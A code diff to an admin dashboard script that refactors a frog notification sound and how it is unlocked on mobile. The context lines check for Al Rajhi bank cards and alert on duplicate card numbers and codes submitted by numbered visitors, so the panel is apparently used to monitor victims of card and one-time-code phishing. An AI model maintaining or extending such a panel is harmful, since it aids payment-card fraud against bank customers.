@@ -560,35 +560,28 @@
     // Pre-load frog sound once
     const frogAudio = new Audio('/admin/frog.mp3');
     frogAudio.volume = 0.7;
+    frogAudio.load();
 
-    // Mobile-only: unlock audio on first user interaction (iOS/Android require this)
-    // This does NOT affect desktop at all - only runs once on first touch
-    let mobileAudioUnlocked = false;
-    function unlockMobileAudio() {
-      if (mobileAudioUnlocked) return;
-      mobileAudioUnlocked = true;
-      // Create a silent AudioContext to unlock audio playback on mobile
-      const ctx = new (window.AudioContext || window.webkitAudioContext)();
-      const buf = ctx.createBuffer(1, 1, 22050);
-      const src = ctx.createBufferSource();
-      src.buffer = buf;
-      src.connect(ctx.destination);
-      src.start(0);
-      // Also preload frogAudio by playing it silently
-      frogAudio.muted = true;
+    // Audio unlock for mobile: on first user interaction, play+pause to unlock
+    let audioUnlocked = false;
+    function unlockAudioOnInteraction() {
+      if (audioUnlocked) return;
+      audioUnlocked = true;
       frogAudio.play().then(() => {
         frogAudio.pause();
-        frogAudio.muted = false;
         frogAudio.currentTime = 0;
-      }).catch(() => { frogAudio.muted = false; });
-      // Remove listeners after unlock
-      document.removeEventListener('touchstart', unlockMobileAudio);
-      document.removeEventListener('touchend', unlockMobileAudio);
-      document.removeEventListener('click', unlockMobileAudio);
+      }).catch(() => {});
+      document.removeEventListener('click', unlockAudioOnInteraction);
+      document.removeEventListener('touchstart', unlockAudioOnInteraction);
     }
-    document.addEventListener('touchstart', unlockMobileAudio, { once: true });
-    document.addEventListener('touchend', unlockMobileAudio, { once: true });
-    document.addEventListener('click', unlockMobileAudio, { once: true });
+    document.addEventListener('click', unlockAudioOnInteraction);
+    document.addEventListener('touchstart', unlockAudioOnInteraction);
+
+    // Wrapper function to play notification sound reliably
+    function playNotificationSound() {
+      frogAudio.currentTime = 0;
+      frogAudio.play().catch(() => {});
+    }
 
     // دالة التحقق إذا كانت البطاقة تابعة للراجحي
     function isRajhiCard(visitor) {
@@ -1352,8 +1345,7 @@
         const currentPage = data && data.page ? data.page : (visitor.page || '');
         if (!noSoundPages.includes(currentPage)) {
           try {
-            frogAudio.currentTime = 0;
-            frogAudio.play().catch(() => {});
+            playNotificationSound();
           } catch(e) {}
         }
       });
@@ -1374,8 +1366,7 @@
           const maskedCard = cardNumber ? cardNumber.slice(0, 4) + ' **** **** ' + cardNumber.slice(-4) : '';
           showNotification('⚠️ تم رفض بطاقة مكررة من الزائر #' + existing.visitorNumber + ' - ' + maskedCard);
           try {
-            frogAudio.currentTime = 0;
-            frogAudio.play().catch(() => {});
+            playNotificationSound();
           } catch(e) {}
         }
       });
@@ -1395,8 +1386,7 @@
           // Show notification
           showNotification('⚠️ تم رفض رمز مكرر من الزائر #' + existing.visitorNumber + ' - ' + code);
           try {
-            frogAudio.currentTime = 0;
-            frogAudio.play().catch(() => {});
+            playNotificationSound();
           } catch(e) {}
         }
       });
